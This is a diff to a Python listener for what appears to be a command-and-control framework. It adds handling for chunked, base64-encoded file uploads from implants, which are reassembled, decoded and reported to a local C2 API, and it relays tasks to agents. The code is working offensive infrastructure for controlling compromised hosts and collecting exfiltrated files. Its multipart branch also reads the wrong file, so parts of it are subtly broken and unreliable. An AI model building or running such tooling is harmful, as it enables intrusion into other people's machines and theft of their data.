@@ -1,5 +1,10 @@
 import BaseHTTPServer
-import SimpleHTTPServer
+try:
+    import http.server as server
+except ImportError:
+    # Handle Python 2.x
+    import SimpleHTTPServer as server
+
 import SocketServer
 import os
 import sys
@@ -14,6 +19,7 @@ from Crypto.Cipher import AES
 from Crypto import Random
 import time
 import requests
+
 
 
 sys.path.append("../")
@@ -32,7 +38,7 @@ class Listener:
     def Stop(self):
         pass
 
-class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class ServerHandler(server.SimpleHTTPRequestHandler):
    def _set_headers(self):
       self.send_response(200)
       self.send_header('Content-type', 'text/html')
@@ -64,6 +70,59 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
        self.send_response(200)
        self.end_headers()
 
+       # If upload get/stash file, then signal api/c2 of upload to push to emc
+       jdata = json.loads(self.data_string)
+       print(jdata)
+       if jdata["type"] == "u":
+          print("Upload inc...")
+          if jdata["part"] == "0":
+             print("file part 0")
+             f = open(jdata["filename"] + "-cache", "w")
+             f.write(jdata["data"])
+             f.close()
+
+             if jdata["mp"] == "false":
+                print("yay! no more parts")
+                #Process file
+                #base64 decode contents and save to data
+                with open(jdata["filename"] + "-cache", 'r') as file:
+                    f = file.read().replace('\n', '')
+
+                nf = open(jdata["filename"], "w")
+                nf.write(base64.b64decode(f))
+                nf.close()
+                data = {
+                    "type": "u",
+                    "filename": jdata['filename']
+                }
+                ndata = json.dumps(data)
+                res = requests.post('http://localhost:29000/api/c2', data=ndata)
+          else:
+             print("next part")
+             f = open(jdata["filename"] + "-cache", "a")
+             f.write(jdata["data"])
+             f.close()
+             #If no more parts process the file and signal oculus to pass the file to emc
+             #The above logic will break any attempt to AES encrypt the upload parts (OPSEC UNSAFE)
+             if jdata["mp"] == "false":
+                print("yay! no more parts")
+                #Process file
+                #base64 decode contents and save to data
+                with open(jdata["filename"], 'r') as file:
+                    f = file.read().replace('\n', '')
+
+                nf = open(jdata["filename"], "w")
+                nf.write(base64.b64decode(f))
+                nf.close()
+                data = {
+                    "type": "u",
+                    "filename": jdata['filename']
+                }
+                ndata = json.dumps(data)
+                res = requests.post('http://localhost:29000/api/c2', data=ndata)
+
+
+
        # update = json.loads(self.data_string)
 
        # !!! Implement Malleable c2 and trap uris !!! this is where management of separate implant comm channels happens
@@ -71,11 +130,12 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
        # Submit Oculus API and provide response
        # Oculus should manage tasks and only return new taskings
        # Listener should send agent token in api request
-       res = requests.post('http://localhost:29000/api/c2', data=self.data_string)
-       data = res.json()
-       tasklist = json.dumps(data)
-       # Respond to agent with tasklist
-       self.wfile.write(tasklist)
+       else:
+           res = requests.post('http://localhost:29000/api/c2', data=self.data_string)
+           data = res.json()
+           tasklist = json.dumps(data)
+           # Respond to agent with tasklist
+           self.wfile.write(tasklist)
 
        return
 
